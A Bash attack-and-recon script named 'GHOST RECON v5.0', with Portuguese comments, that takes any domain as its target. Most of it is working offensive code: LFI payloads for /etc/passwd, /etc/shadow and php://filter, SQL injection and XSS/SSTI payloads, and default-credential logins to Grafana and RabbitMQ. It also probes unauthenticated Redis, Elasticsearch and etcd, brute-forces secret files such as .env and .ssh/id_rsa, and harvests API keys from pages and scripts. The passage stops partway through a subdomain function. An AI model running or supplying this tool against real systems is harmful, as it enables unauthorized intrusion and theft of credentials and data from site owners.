#!/data/data/com.termux/files/usr/bin/bash
# GHOST RECON v5.0 - Fast & Advanced
# Uso: bash recon.sh alvo.com

R='\033[0;31m'; G='\033[0;32m'; Y='\033[1;33m'; C='\033[0;36m'; W='\033[1;37m'; N='\033[0m'

TARGET="${1:-}"
[ -z "$TARGET" ] && read -p "Alvo: " TARGET
DOMAIN=$(echo "$TARGET" | sed 's~https\?://~~;s~www\.~~;s~/.*~~' | tr '[:upper:]' '[:lower:]' | tr -d ' ')
URL="https://$DOMAIN"
LOG="$HOME/recon_${DOMAIN}_$(date +%Y%m%d_%H%M%S).log"
VULN=0
URLS=()

v(){ ((VULN++)); echo -e "${R}[VULN]${N} $1" | tee -a "$LOG"; URLS+=("$1"); }
i(){ echo -e "${G}[+]${N} $1" | tee -a "$LOG"; }
w(){ echo -e "${Y}[!]${N} $1" | tee -a "$LOG"; }
s(){ echo -e "${C}  > $1${N}" | tee -a "$LOG"; }
t(){ echo -e "${W}--- $1 ---${N}"; echo "--- $1 ---" >> "$LOG"; }

echo "GHOST RECON v5.0 - $DOMAIN - $(date)" | tee "$LOG"
echo "================================================" >> "$LOG"

# deps
for dep in curl dig nmap host whois traceroute python3 openssl nc; do
  command -v "$dep" &>/dev/null || pkg install "$dep" -y &>/dev/null
done

# resolve
IPV4=$(dig +short "$DOMAIN" A 2>/dev/null | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+')
IP=$(echo "$IPV4" | head -1)
[ -z "$IP" ] && IP=$(host "$DOMAIN" 2>/dev/null | awk '/has address/{print $NF}' | head -1)
[ -z "$IP" ] && echo "Nao resolveu $DOMAIN" && exit 1
i "IP: $IP | Dominio: $DOMAIN"

# ── PARALELO: funcoes que rodam em background ──────────────────

geo_scan(){
  t "GEOIP"
  G=$(curl -s --max-time 6 "http://ip-api.com/json/$IP?fields=country,regionName,city,isp,org,as,proxy,hosting,lat,lon" 2>/dev/null)
  s "Pais:  $(echo $G|grep -o '"country":"[^"]*"'|cut -d'"' -f4)"
  s "Cidade: $(echo $G|grep -o '"city":"[^"]*"'|cut -d'"' -f4)"
  s "ISP:   $(echo $G|grep -o '"isp":"[^"]*"'|cut -d'"' -f4)"
  s "AS:    $(echo $G|grep -o '"as":"[^"]*"'|cut -d'"' -f4)"
  LAT=$(echo $G|grep -o '"lat":[^,}]*'|cut -d: -f2)
  LON=$(echo $G|grep -o '"lon":[^,}]*'|cut -d: -f2)
  [ -n "$LAT" ] && s "Maps: https://maps.google.com/?q=$LAT,$LON"
  echo $G|grep -o '"proxy":true' &>/dev/null && v "PROXY/VPN em $IP"
  echo $G|grep -o '"hosting":true' &>/dev/null && w "Datacenter/Hosting detectado"
}

dns_scan(){
  t "DNS + ZONE TRANSFER"
  for T in A AAAA MX NS TXT CNAME SOA CAA SRV; do
    R=$(dig +short "$DOMAIN" $T 2>/dev/null)
    [ -n "$R" ] && i "[$T]" && echo "$R"|while read r; do s "$r"; done
  done
  dig +short "$DOMAIN" NS 2>/dev/null | while read ns; do
    AXFR=$(dig axfr "$DOMAIN" @"$ns" 2>/dev/null)
    echo "$AXFR"|grep -qv "failed\|refused\|NOTAUTH" && v "ZONE TRANSFER via $ns!" && echo "$AXFR"|head -20|while read l; do s "$l"; done
  done
}

whois_scan(){
  t "WHOIS"
  whois "$DOMAIN" 2>/dev/null | grep -iE "registrar|creation|expir|name.?server|registrant|email|country|dnssec" | sort -u | head -15 | while read l; do s "$l"; done
  whois "$IP" 2>/dev/null | grep -iE "netname|country|org|cidr|inetnum|abuse" | sort -u | head -8 | while read l; do s "$l"; done
}

hidden_ip_scan(){
  t "IP REAL / BYPASS CDN"
  for sub in mail ftp smtp pop imap webmail cpanel whm api dev stage staging test beta admin cdn ns1 ns2 vpn remote; do
    SIP=$(dig +short "$sub.$DOMAIN" A 2>/dev/null | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' | head -1)
    [ -n "$SIP" ] && [ "$SIP" != "$IP" ] && v "IP real em $sub.$DOMAIN -> $SIP"
  done
  dig +short "$DOMAIN" TXT 2>/dev/null | grep -oE 'ip4:[^ "]+' | while read ip; do v "SPF IP leak: $ip"; done
  MX=$(dig +short "$DOMAIN" MX 2>/dev/null | awk '{print $2}')
  for mx in $MX; do
    MXI=$(dig +short "$mx" A 2>/dev/null | head -1)
    [ -n "$MXI" ] && [ "$MXI" != "$IP" ] && v "MX IP diferente: $mx -> $MXI"
  done
  curl -s --max-time 10 "https://crt.sh/?q=%25.$DOMAIN&output=json" 2>/dev/null | \
    python3 -c "
import sys,json
try:
  [print(n.strip().replace('*.','')) for e in json.load(sys.stdin) for n in e.get('name_value','').split('\n') if '$DOMAIN' in n]
except: pass
" 2>/dev/null | sort -u | while read sub; do
    SIP=$(dig +short "$sub" A 2>/dev/null | head -1)
    [ -n "$SIP" ] && s "crt.sh: $sub -> $SIP"
  done
}

http_scan(){
  t "HTTP HEADERS + TECNOLOGIAS"
  H=$(curl -sI --max-time 8 "$URL" 2>/dev/null)
  echo "$H" | grep -iE "^server:|^x-powered-by:|^x-generator:|^x-cms:|^via:|^x-cache:" | while read l; do s "$l"; done
  PAGE=$(curl -sk --max-time 10 "$URL" 2>/dev/null)
  echo "$PAGE"|grep -qi "wp-content\|wordpress" && i "CMS: WordPress"
  echo "$PAGE"|grep -qi "joomla" && i "CMS: Joomla"
  echo "$PAGE"|grep -qi "drupal" && i "CMS: Drupal"
  echo "$PAGE"|grep -qi "x-powered-by: php\|\.php" && i "Backend: PHP"
  echo "$H"|grep -qi "server: nginx" && i "Servidor: NGINX"
  echo "$H"|grep -qi "server: apache" && i "Servidor: Apache"
  echo "$H"|grep -qi "cloudflare" && w "CDN: Cloudflare"
  echo "$H"|grep -qi "x-amz\|cloudfront" && w "CDN: AWS CloudFront"
  echo "$H"|grep -qi "sucuri\|incapsula" && w "WAF detectado"
  echo "$H"|grep -qi "Strict-Transport-Security" || w "HSTS ausente"
  echo "$H"|grep -qi "X-Frame-Options" || w "X-Frame-Options ausente"
  echo "$H"|grep -qi "Content-Security-Policy" || w "CSP ausente"
}

ssl_scan(){
  t "SSL/TLS"
  CERT=$(echo | timeout 8 openssl s_client -connect "$DOMAIN:443" -servername "$DOMAIN" 2>/dev/null | openssl x509 -noout -text 2>/dev/null)
  [ -z "$CERT" ] && w "SSL nao disponivel" && return
  echo "$CERT" | grep -E "Not Before|Not After|Subject:" | while read l; do s "$l"; done
  SANS=$(echo "$CERT" | grep -A3 "Subject Alternative Name" | grep -oE "DNS:[^,\n]*|IP Address:[^,\n]*")
  [ -n "$SANS" ] && i "SANs:" && echo "$SANS" | while read s2; do s "$s2"; done
  for proto in ssl3 tls1 tls1_1; do
    echo | timeout 3 openssl s_client -connect "$DOMAIN:443" -$proto 2>&1 | grep -qi "Cipher\|handshake" && v "Protocolo inseguro: $proto"
  done
}

# ── DB PORT SCANNER ────────────────────────────────────────────

db_scan(){
  t "DATABASE PORTS"
  declare -A DBPORTS=(
    [3306]="MySQL" [3307]="MySQL-Alt" [33060]="MySQL-X"
    [5432]="PostgreSQL" [5433]="PG-Alt" [6432]="PgBouncer"
    [27017]="MongoDB" [27018]="MongoDB-2" [27019]="MongoDB-3"
    [6379]="Redis" [6380]="Redis-TLS"
    [9200]="Elasticsearch" [9300]="ES-Transport"
    [5984]="CouchDB" [8529]="ArangoDB"
    [7474]="Neo4j" [7687]="Neo4j-Bolt"
    [9042]="Cassandra" [7000]="Cassandra-2"
    [2181]="Zookeeper"
    [11211]="Memcached"
    [15672]="RabbitMQ-Mgmt" [5672]="RabbitMQ"
    [1433]="MSSQL" [1521]="Oracle" [50000]="DB2"
    [8086]="InfluxDB" [28015]="RethinkDB"
    [8983]="Solr" [9090]="Prometheus"
    [3000]="Grafana" [5601]="Kibana"
    [8123]="ClickHouse" [19000]="CH-TCP"
    [2379]="etcd" [2380]="etcd-Peer"
    [8080]="HTTP-Alt" [8888]="Jupyter"
  )

  for port in $(echo "${!DBPORTS[@]}" | tr ' ' '\n' | sort -n); do
    SVC="${DBPORTS[$port]}"
    ( timeout 1 bash -c "echo '' > /dev/tcp/$IP/$port" 2>/dev/null && {
      v "DB ABERTO: $port/$SVC em $IP"
      db_check "$port" "$SVC"
    } ) &
  done
  wait
}

db_check(){
  PORT="$1"; SVC="$2"
  case "$PORT" in
    3306|3307|33060)
      v "mysql://$IP:$PORT"
      for p in phpmyadmin pma adminer db/adminer.php; do
        C=$(curl -sk --max-time 3 -o /dev/null -w "%{http_code}" "http://$DOMAIN/$p" 2>/dev/null)
        [ "$C" = "200" ] && v "MySQL Panel: http://$DOMAIN/$p"
      done
      BNR=$(timeout 2 bash -c "cat < /dev/tcp/$IP/$PORT 2>/dev/null" | strings 2>/dev/null | head -c 100)
      [ -n "$BNR" ] && s "MySQL Banner: $BNR"
      ;;
    5432|5433|6432)
      v "postgresql://$IP:$PORT"
      s "pgAdmin: http://$IP:5050"
      ;;
    27017|27018|27019)
      v "mongodb://$IP:$PORT (provavelmente SEM AUTH)"
      HTTP=$(curl -s --max-time 4 "http://$IP:28017/" 2>/dev/null)
      echo "$HTTP" | grep -qi "mongo\|databases" && v "MongoDB HTTP interface aberta: http://$IP:28017/"
      ;;
    6379|6380)
      PONG=$(printf "*1\r\n\$4\r\nPING\r\n" | timeout 3 nc -w 2 "$IP" "$PORT" 2>/dev/null)
      if echo "$PONG" | grep -qi "PONG"; then
        v "Redis SEM SENHA em $IP:$PORT"
        INFO=$(printf "*1\r\n\$4\r\nINFO\r\n" | timeout 3 nc -w 2 "$IP" "$PORT" 2>/dev/null | grep -E "redis_version|os:|role:" | head -3)
        [ -n "$INFO" ] && s "$INFO"
        DIR=$(printf "*3\r\n\$6\r\nCONFIG\r\n\$3\r\nGET\r\n\$3\r\ndir\r\n" | timeout 3 nc -w 2 "$IP" "$PORT" 2>/dev/null | strings | tail -1)
        [ -n "$DIR" ] && s "Redis dir: $DIR"
      fi
      ;;
    9200|9300)
      ES=$(curl -s --max-time 4 "http://$IP:9200/" 2>/dev/null)
      if echo "$ES" | grep -qi "cluster_name"; then
        v "Elasticsearch SEM AUTH: http://$IP:9200"
        v "Indices: http://$IP:9200/_cat/indices?v"
        v "Nodes:   http://$IP:9200/_cat/nodes?v"
        v "Data:    http://$IP:9200/_all/_search?pretty"
        IDX=$(curl -s --max-time 4 "http://$IP:9200/_cat/indices?v" 2>/dev/null | head -5)
        [ -n "$IDX" ] && s "Indices: $IDX"
      fi
      ;;
    5984)
      DBS=$(curl -s --max-time 4 "http://$IP:5984/_all_dbs" 2>/dev/null)
      echo "$DBS" | grep -q "\[" && v "CouchDB SEM AUTH: http://$IP:5984/_all_dbs | DBs: $DBS"
      ;;
    11211)
      STATS=$(echo "stats" | timeout 3 nc -w 2 "$IP" "$PORT" 2>/dev/null | head -3)
      [ -n "$STATS" ] && v "Memcached SEM AUTH em $IP:$PORT"
      ;;
    5601)
      KIB=$(curl -s --max-time 4 "http://$IP:5601/api/status" 2>/dev/null)
      echo "$KIB" | grep -qi "kibana\|version" && v "Kibana SEM AUTH: http://$IP:5601"
      ;;
    3000)
      GRAF=$(curl -s --max-time 4 "http://$IP:3000/api/health" 2>/dev/null)
      if echo "$GRAF" | grep -qi "ok"; then
        v "Grafana em http://$IP:3000"
        GAUTH=$(curl -s --max-time 4 -u "admin:admin" "http://$IP:3000/api/org" 2>/dev/null)
        echo "$GAUTH" | grep -qi '"id"' && v "Grafana admin:admin FUNCIONOU! http://$IP:3000"
      fi
      ;;
    9090)
      P=$(curl -s --max-time 4 "http://$IP:9090/-/healthy" 2>/dev/null)
      echo "$P" | grep -qi "Healthy" && v "Prometheus SEM AUTH: http://$IP:9090/metrics"
      ;;
    8086)
      PC=$(curl -s --max-time 4 -o /dev/null -w "%{http_code}" "http://$IP:8086/ping" 2>/dev/null)
      [ "$PC" = "204" ] && v "InfluxDB SEM AUTH: http://$IP:8086/query?q=SHOW+DATABASES"
      ;;
    8123)
      CH=$(curl -s --max-time 4 "http://$IP:8123/?query=SELECT+1" 2>/dev/null)
      [ "$CH" = "1" ] && v "ClickHouse SEM AUTH: http://$IP:8123/?query=SHOW+DATABASES"
      ;;
    2379)
      ET=$(curl -s --max-time 4 "http://$IP:2379/v3/cluster/member/list" 2>/dev/null)
      echo "$ET" | grep -qi "members" && v "etcd SEM AUTH (k8s secrets expostos): http://$IP:2379/v2/keys/"
      ;;
    2181)
      ZK=$(echo "ruok" | timeout 3 nc -w 2 "$IP" "$PORT" 2>/dev/null)
      [ "$ZK" = "imok" ] && v "Zookeeper SEM AUTH em $IP:$PORT"
      ;;
    15672)
      R=$(curl -s --max-time 4 -u "guest:guest" "http://$IP:15672/api/overview" 2>/dev/null)
      echo "$R" | grep -qi "rabbitmq_version" && v "RabbitMQ guest:guest OK: http://$IP:15672"
      ;;
    8983)
      SOLR=$(curl -s --max-time 4 "http://$IP:8983/solr/admin/info/system?wt=json" 2>/dev/null)
      echo "$SOLR" | grep -qi "solr_spec_version" && v "Apache Solr SEM AUTH: http://$IP:8983/solr"
      ;;
    8080|8888)
      for p in phpmyadmin pma adminer phpMyAdmin; do
        C=$(curl -sk --max-time 3 -o /dev/null -w "%{http_code}" "http://$IP:$PORT/$p" 2>/dev/null)
        [ "$C" = "200" ] && v "Painel DB: http://$IP:$PORT/$p"
      done
      ;;
    1433)
      v "MSSQL exposto: $IP:$PORT"
      s "URLs: http://$DOMAIN/reportserver | http://$DOMAIN/reports"
      ;;
  esac
}

# ── FILE VULN SCANNER ─────────────────────────────────────────

file_scan(){
  t "ARQUIVO VULNERAVEL SCANNER"

  # LFI
  i "LFI scan..."
  LFI_PAYLOADS=(
    "../../../../../../etc/passwd"
    "../../../../../../etc/shadow"
    "../../../../../../proc/self/environ"
    "../../../../../../var/log/apache2/access.log"
    "../../../../../../var/log/nginx/access.log"
    "../../../../windows/win.ini"
    "php://filter/convert.base64-encode/resource=/etc/passwd"
    "php://filter/read=convert.base64-encode/resource=index.php"
    "expect://id"
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
    "....//....//....//etc//passwd"
    "..%2F..%2F..%2Fetc%2Fpasswd"
    "/etc/passwd%00"
    "../../../../../../etc/mysql/my.cnf"
    "../../../../../../etc/php.ini"
  )
  LFI_PARAMS=(file page path include template doc view lang module read source)
  for param in "${LFI_PARAMS[@]}"; do
    for payload in "${LFI_PAYLOADS[@]}"; do
      ENC=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$payload" 2>/dev/null || echo "$payload")
      R=$(curl -sk --max-time 5 "$URL/?$param=$ENC" 2>/dev/null)
      if echo "$R" | grep -qiE "root:.*:0:|bin:/bin|\\[extensions\\]|\\[boot loader\\]"; then
        v "LFI em ?$param= : $URL/?$param=$ENC"
        echo "$R" | grep -E "root:|bin:|daemon:" | head -3 | while read l; do s "$l"; done
        break 2
      fi
    done
  done &

  # Config/Backup/Sensitive files - paralelo
  i "Config/Backup files scan..."
  SENSITIVE_FILES=(
    .env .env.local .env.production .env.backup .env.example
    wp-config.php wp-config.php.bak wp-config.php~ wp-config.php.old
    config.php config.php.bak settings.php database.php db.php
    .git/config .git/HEAD .svn/entries
    phpinfo.php info.php test.php debug.php php.php
    adminer.php db.php sql.php shell.php cmd.php
    backup.zip backup.tar.gz backup.sql site.zip
    database.sql dump.sql mysql.sql db.sql schema.sql
    docker-compose.yml docker-compose.yaml .dockerenv
    .htpasswd .htaccess .bash_history .ssh/id_rsa id_rsa
    composer.json composer.lock package.json
    error.log error_log access.log debug.log app.log
    storage/logs/laravel.log wp-content/debug.log
    .DS_Store Thumbs.db
    crossdomain.xml clientaccesspolicy.xml
    README.md CHANGELOG.md INSTALL.md
    config.yml config.yaml config.json secrets.json
    appsettings.json web.config
    server.key private.key ssl.key
    application.properties application.yml
    api.php api/config.php includes/config.php inc/config.php
    sites/default/settings.php app/config/parameters.yml
    config/database.yml config/secrets.yml
    src/config.php lib/config.php
    .npmrc .pypirc .netrc .gitignore
    Gemfile Gemfile.lock requirements.txt Pipfile
    proc/self/environ
    server-status server-info nginx_status
  )

  for f in "${SENSITIVE_FILES[@]}"; do
    (
    CODE=$(curl -sk --max-time 4 -o /tmp/recon_tmp_$$ -w "%{http_code}" "$URL/$f" 2>/dev/null)
    if [ "$CODE" = "200" ]; then
      SZ=$(wc -c < /tmp/recon_tmp_$$ 2>/dev/null)
      CONT=$(cat /tmp/recon_tmp_$$ 2>/dev/null | head -c 400)
      if echo "$CONT" | grep -qiE "password|passwd|secret|key|token|database|DB_|mysql|redis|mongo|connect|auth|credential|private|aws|api_key"; then
        v "ARQUIVO SENSIVEL ($SZ bytes): $URL/$f"
        echo "$CONT" | grep -iE "password|passwd|secret|key|token|DB_" | head -3 | while read l; do s "  $l"; done
      elif [ "$SZ" -gt 200 ]; then
        w "Arquivo acessivel ($SZ bytes): $URL/$f"
      fi
    fi
    rm -f /tmp/recon_tmp_$$ 2>/dev/null
    ) &
    # Limitar paralelo
    [ $(jobs -r | wc -l) -ge 30 ] && wait
  done
  wait

  # Git exposto detalhado
  GIT=$(curl -sk --max-time 5 "$URL/.git/config" 2>/dev/null)
  if echo "$GIT" | grep -qi "\[core\]\|\[remote\]"; then
    v ".git EXPOSTO: $URL/.git/config"
    v "$URL/.git/HEAD"
    v "$URL/.git/COMMIT_EDITMSG"
    v "$URL/.git/logs/HEAD"
    REM=$(echo "$GIT" | grep "url = " | head -1)
    [ -n "$REM" ] && s "Remote: $REM"
  fi
}

# ── DIRECTORY BRUTE ───────────────────────────────────────────

dir_scan(){
  t "DIRECTORY BRUTE FORCE"
  DIRS=(
    admin administrator admin/ wp-admin/ login/ dashboard/ panel/ control/
    api api/v1 api/v2 api/v3 rest graphql swagger swagger-ui swagger.json openapi.json api-docs
    uploads upload files media img images assets static src
    backup backups bkp bak old archive tmp temp cache storage
    phpmyadmin pma adminer pgadmin pgadmin4 mongo-express redis-commander kibana grafana
    phpinfo.php info.php test.php debug.php shell.php cmd.php
    .well-known/security.txt .well-known/apple-app-site-association
    server-status server-info nginx_status php_status actuator actuator/env actuator/health metrics
    console terminal exec install setup installer
    sitemap.xml robots.txt crossdomain.xml security.txt
    cgi-bin cgi bin scripts perl WEB-INF/ META-INF/
    solr jenkins nexus jira confluence sonarqube
    elmah.axd trace.axd wp-login.php xmlrpc.php wp-json/wp/v2/users
    webdav dav
    .env .git .svn .hg
    vendor node_modules bower_components
    includes lib modules plugins components
    dev staging test uat qa prod production beta alpha
  )
  for dir in "${DIRS[@]}"; do
    (
    CODE=$(curl -sk --max-time 4 -o /dev/null -w "%{http_code}" "$URL/$dir" 2>/dev/null)
    case "$CODE" in
      200) v "ACESSIVEL ($CODE): $URL/$dir" ;;
      301|302) w "Redirect ($CODE): $URL/$dir" ;;
      401|403) s "Auth required ($CODE): $URL/$dir" ;;
    esac
    ) &
    [ $(jobs -r | wc -l) -ge 40 ] && wait
  done
  wait
}

# ── SQL INJECTION ─────────────────────────────────────────────

sqli_scan(){
  t "SQL INJECTION"
  PAYLOADS=("'" "''" "' OR '1'='1" "' OR 1=1--" "\" OR 1=1--" "' UNION SELECT NULL--" "1 AND SLEEP(5)--" "1' AND SLEEP(5)--" "'; WAITFOR DELAY '0:0:5'--" "' ORDER BY 100--" "' AND EXTRACTVALUE(0,CONCAT(0x7e,VERSION()))--")
  ERRORS=("sql syntax" "mysql_fetch" "You have an error in your SQL" "ORA-[0-9]" "PostgreSQL.*ERROR" "SQLSTATE" "Unclosed quotation mark" "ODBC SQL Server" "mysql_num_rows" "Division by zero" "DB Error" "database error" "Warning.*mysql_" "pg_query\|pg_exec" "SQLite.*error" "SQLITE_ERROR" "Microsoft.*Database.*Error" "stack trace:")
  PARAMS=(id page cat p q search s item user uid lang type action module key name value data input filter sort order by)

  for param in "${PARAMS[@]}"; do
    for payload in "${PAYLOADS[@]}"; do
      ENC=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$payload" 2>/dev/null || echo "$payload")
      T1=$(date +%s%3N 2>/dev/null || echo 0)
      R=$(curl -sk --max-time 8 "$URL/?$param=$ENC" 2>/dev/null)
      T2=$(date +%s%3N 2>/dev/null || echo 0)
      ELAPSED=$(( T2 - T1 ))
      for err in "${ERRORS[@]}"; do
        echo "$R" | grep -qiE "$err" && { v "SQLi (Error-Based) ?$param= | $URL/?$param=$ENC"; break 3; }
      done
      [ "$ELAPSED" -ge 4500 ] && { v "SQLi (Time-Based Blind) ?$param= ${ELAPSED}ms | $URL/?$param=$ENC"; break 2; }
    done
  done
}

# ── XSS ──────────────────────────────────────────────────────

xss_scan(){
  t "XSS"
  PAYLOADS=("<script>alert(1)</script>" "<img src=x onerror=alert(1)>" "<svg onload=alert(1)>" "\"'><script>alert(1)</script>" "javascript:alert(1)" "{{7*7}}" "${7*7}" "';alert(1)//")
  PARAMS=(q search s name value message comment title text body content query input)
  for param in "${PARAMS[@]}"; do
    for payload in "${PAYLOADS[@]}"; do
      ENC=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$payload" 2>/dev/null || echo "$payload")
      R=$(curl -sk --max-time 5 "$URL/?$param=$ENC" 2>/dev/null)
      echo "$R" | grep -qF "$payload" && { v "XSS Refletido ?$param= | $URL/?$param=$ENC"; break 2; }
      (echo "$payload" | grep -q "7\*7") && echo "$R" | grep -q "49" && { v "SSTI detectado ?$param= | $URL/?$param=$ENC"; break 2; }
    done
  done
}

# ── CORS ─────────────────────────────────────────────────────

cors_scan(){
  t "CORS"
  R=$(curl -sI --max-time 6 -H "Origin: https://evil.com" "$URL" 2>/dev/null)
  ACAO=$(echo "$R" | grep -i "Access-Control-Allow-Origin" | head -1)
  echo "$ACAO" | grep -qi "evil.com\|\*" && v "CORS misconfiguration: $ACAO"
  echo "$R" | grep -qi "Access-Control-Allow-Credentials: true" && echo "$ACAO" | grep -qi "evil.com" && v "CORS + Credentials=true: CRITICO"
}

# ── OPEN REDIRECT ────────────────────────────────────────────

redir_scan(){
  t "OPEN REDIRECT"
  PARAMS=(url redirect return next go to dest destination location href callback continue)
  PAYLOADS=("https://evil.com" "//evil.com" "///evil.com" "https://$DOMAIN@evil.com")
  for param in "${PARAMS[@]}"; do
    for payload in "${PAYLOADS[@]}"; do
      ENC=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$payload" 2>/dev/null || echo "$payload")
      LOC=$(curl -sk --max-time 4 -D - -o /dev/null "$URL/?$param=$ENC" 2>/dev/null | grep -i "^Location:" | head -1)
      echo "$LOC" | grep -qi "evil.com" && { v "Open Redirect ?$param= | $URL/?$param=$ENC"; break 2; }
    done
  done
}

# ── API KEY LEAK ─────────────────────────────────────────────

apikey_scan(){
  t "API KEYS / SECRETS LEAK"
  PAGE=$(curl -sk --max-time 10 "$URL" 2>/dev/null)
  JS=$(echo "$PAGE" | grep -oE 'src="[^"]*\.js[^"]*"' | sed 's/src="//;s/"//' | head -15)

  scan_keys(){
    CONTENT="$1"; SRC="$2"
    declare -A PATS=(
      ["AIza[0-9A-Za-z_-]{35}"]="Google API Key"
      ["AKIA[0-9A-Z]{16}|AKID[A-Z0-9]{16}"]="AWS Access Key"
      ["aws_secret_access_key[^=]*=[^A-Za-z0-9/+]*[A-Za-z0-9/+]{40}"]="AWS Secret"
      ["sk_live_[0-9a-zA-Z]{24,}"]="Stripe Live Key"
      ["sk_test_[0-9a-zA-Z]{24,}"]="Stripe Test Key"
      ["xox[baprs]-[0-9a-zA-Z]{10,48}"]="Slack Token"
      ["ghp_[0-9a-zA-Z]{36}"]="GitHub Token"
      ["glpat-[0-9a-zA-Z_-]{20}"]="GitLab Token"
      ["eyJ[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}"]="JWT Token"
      ["-----BEGIN.*PRIVATE KEY"]="Private Key"
      ["mongodb(\+srv)?://[^\"' ]{10,}"]="MongoDB connstr"
      ["redis://[^\"' ]{8,}"]="Redis connstr"
      ["postgres(ql)?://[^\"' ]{8,}"]="PG connstr"
      ["mysql://[^\"' ]{8,}"]="MySQL connstr"
      ["jdbc:[a-z]+://[a-zA-Z0-9./_:-]{10,}"]="JDBC connstr"
      ["SG\.[a-zA-Z0-9_-]{22}\.[a-zA-Z0-9_-]{43}"]="SendGrid Key"
      ["[0-9a-f]{32}-us[0-9]+"]="Mailchimp Key"
      ["npm_[a-zA-Z0-9]{36}"]="NPM Token"
      ["[Pp][Aa][Ss][Ss][Ww][Oo][Rr][Dd][^=]*=[^'\"]{1,3}['\"][^'\"]{8,}['\"]"]="Hardcoded Password"
      ["[Ss][Ee][Cc][Rr][Ee][Tt][_Kk][Ee][Yy][^=]*=[^'\"]{1,3}['\"][^'\"]{16,}['\"]"]="Secret Key"
      ["[Aa][Pp][Ii][_-][Kk][Ee][Yy][^=]*=[^'\"]{1,3}['\"][^'\"]{16,}['\"]"]="API Key"
    )
    for pat in "${!PATS[@]}"; do
      MATCH=$(echo "$CONTENT" | grep -oiE "$pat" | head -2)
      [ -n "$MATCH" ] && v "${PATS[$pat]} em $SRC: $MATCH"
    done
  }

  scan_keys "$PAGE" "$URL"
  echo "$JS" | while read jsf; do
    [ -z "$jsf" ] && continue
    JSURL="$URL$jsf"; [[ "$jsf" == http* ]] && JSURL="$jsf"
    JSC=$(curl -sk --max-time 6 "$JSURL" 2>/dev/null)
    [ -n "$JSC" ] && scan_keys "$JSC" "$JSURL"
  done
}

# ── CMS SCAN ─────────────────────────────────────────────────

cms_scan(){
  t "CMS SCAN"
  PAGE=$(curl -sk --max-time 8 "$URL" 2>/dev/null)

  if echo "$PAGE" | grep -qi "wp-content\|wp-includes"; then
    i "WordPress detectado"
    C=$(curl -sk --max-time 4 -o /dev/null -w "%{http_code}" "$URL/readme.html" 2>/dev/null)
    [ "$C" = "200" ] && v "WP readme.html: $URL/readme.html"
    for f in wp-config.php.bak wp-config.php~ wp-config.php.old; do
      C=$(curl -sk --max-time 3 -o /dev/null -w "%{http_code}" "$URL/$f" 2>/dev/null)
      [ "$C" = "200" ] && v "WP config backup: $URL/$f"
    done
    WPUR=$(curl -sk --max-time 5 "$URL/wp-json/wp/v2/users" 2>/dev/null)
    echo "$WPUR" | grep -qi '"slug"' && v "WP users API: $URL/wp-json/wp/v2/users"
    XMLRPC=$(curl -sk --max-time 4 "$URL/xmlrpc.php" 2>/dev/null)
    echo "$XMLRPC" | grep -qi "XML-RPC\|xmlrpc" && v "WP xmlrpc.php ativo (bruteforce!): $URL/xmlrpc.php"
    w "WP login: $URL/wp-login.php"
    for plugin in contact-form-7 yoast-seo woocommerce elementor revolution-slider wp-file-manager; do
      C=$(curl -sk --max-time 3 -o /dev/null -w "%{http_code}" "$URL/wp-content/plugins/$plugin/readme.txt" 2>/dev/null)
      [ "$C" = "200" ] && s "Plugin: $plugin"
    done
  fi

  if echo "$PAGE" | grep -qi "joomla"; then
    i "Joomla detectado"
    v "$URL/administrator"
    C=$(curl -sk --max-time 3 -o /dev/null -w "%{http_code}" "$URL/configuration.php.bak" 2>/dev/null)
    [ "$C" = "200" ] && v "Joomla config backup: $URL/configuration.php.bak"
  fi

  if echo "$PAGE" | grep -qi "drupal"; then
    i "Drupal detectado"
    C=$(curl -sk --max-time 3 -o /dev/null -w "%{http_code}" "$URL/sites/default/settings.php" 2>/dev/null)
    [ "$C" = "200" ] && v "Drupal settings.php: $URL/sites/default/settings.php"
  fi
}

# ── SENSITIVE DATA ────────────────────────────────────────────

sensitive_scan(){
  t "SENSITIVE DATA"
  PAGE=$(curl -sk --max-time 8 "$URL" 2>/dev/null)

  EMAILS=$(echo "$PAGE" | grep -oiE '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' | grep -v "example\|test\|\.png\|\.jpg" | sort -u | head -5)
  [ -n "$EMAILS" ] && w "Emails expostos: $EMAILS"

  INTERNAL=$(echo "$PAGE" | grep -oE '(10\.[0-9]+\.[0-9]+\.[0-9]+|172\.(1[6-9]|2[0-9]|3[01])\.[0-9]+\.[0-9]+|192\.168\.[0-9]+\.[0-9]+)' | sort -u | head -3)
  [ -n "$INTERNAL" ] && v "IPs internos expostos: $INTERNAL"

  COMMENTS=$(echo "$PAGE" | grep -oiE '<!--[^-]{5,200}-->' | grep -iE "password|secret|key|todo|fix|hack|bug|admin|debug|database|server|config|token" | head -3)
  [ -n "$COMMENTS" ] && v "HTML comments suspeitos: $COMMENTS"

  VERSION=$(curl -sI --max-time 5 "$URL" 2>/dev/null | grep -iE "^Server:|^X-Powered-By:" | head -2)
  [ -n "$VERSION" ] && w "Versao exposta: $VERSION"

  ROBOTS=$(curl -sk --max-time 5 "$URL/robots.txt" 2>/dev/null)
  if [ -n "$ROBOTS" ]; then
    i "robots.txt paths Disallow:"
    echo "$ROBOTS" | grep -i "Disallow:" | head -10 | while read r; do
      P=$(echo "$r" | awk '{print $2}')
      [ -n "$P" ] && w "$URL$P"
    done
  fi
}

# ── SUBDOMAINS ────────────────────────────────────────────────

subdomain_scan(){
  t "SUBDOMINIOS"
  WORDLIST="www mail ftp smtp pop imap webmail cpanel whm api api2 dev dev2 stage staging test beta alpha preview cdn cdn2 static assets app apps mobile m wap admin portal vpn remote ns1 ns2 ns3 mx mx1 support help docs status dashboard monitor git jenkins ci cd"
  for sub in $WORDLIST; do
    (
    SIP=$(dig +short "$sub.$DOMAIN" A 2>/dev/null | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' | head -1)
    if [ -n "$SIP" ]; then
